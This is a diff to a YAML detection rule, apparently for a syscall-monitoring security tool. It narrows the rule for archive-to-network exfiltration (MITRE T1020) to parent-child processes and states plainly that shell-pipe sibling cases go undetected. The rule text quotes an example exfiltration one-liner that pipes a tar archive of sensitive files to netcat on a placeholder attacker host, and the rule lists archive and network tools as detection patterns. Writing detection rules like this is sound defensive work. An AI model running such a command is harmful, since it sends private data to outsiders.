@@ -195,13 +195,19 @@ rules:
 
   # MITRE ATT&CK: T1020 — Automated Exfiltration
   - id: exfil_archive_to_network_pipe
-    name: "Archive tool piped to network utility (automated exfiltration)"
+    name: "Archive tool is the parent of a network utility (automated exfiltration)"
     description: >
-      tar/zip/gzip was executed in a pipeline with a network transmission
-      tool (curl, nc, openssl). This is the classic one-liner pattern for
-      automated exfiltration: `tar czf - /sensitive | nc attacker.com 4444`.
-      The pattern fires on execve of network utilities when the parent or
-      sibling is an archive tool.
+      A network transmission tool (curl, nc, openssl, ...) was execve'd with
+      an archive tool (tar, zip, gzip, ...) as its direct parent process.
+      Covers only the parent-child form of the pattern (e.g. an archiver
+      forking/exec'ing the network tool directly); the classic shell
+      one-liner `tar czf - /sensitive | nc attacker.com 4444` makes the two
+      commands siblings under the same shell, which this predicate does
+      NOT see — the event schema carries proc.comm/proc.ppid/proc.parent_comm
+      (single-event, parent-only), and the correlation engine has no
+      sibling/ancestry-fan-out join (5.9.9.F.4e, №145). Detecting the
+      sibling-pipe form requires new stateful correlator support and is
+      deferred to a follow-up finding.
     event_type: syscall
     condition_group:
       operator: and
@@ -213,6 +219,10 @@ rules:
         - field: syscall.nr
           op: equals
           values: ["59"]    # execve
+        - field: proc.parent_comm
+          op: in
+          values: ["tar", "zip", "gzip", "gunzip", "7z", "7za", "7zr",
+                    "bzip2", "xz", "zstd", "cpio", "rar"]
     severity: warning
     action: alert
     tags: [mitre:T1020, exfiltration, automated]
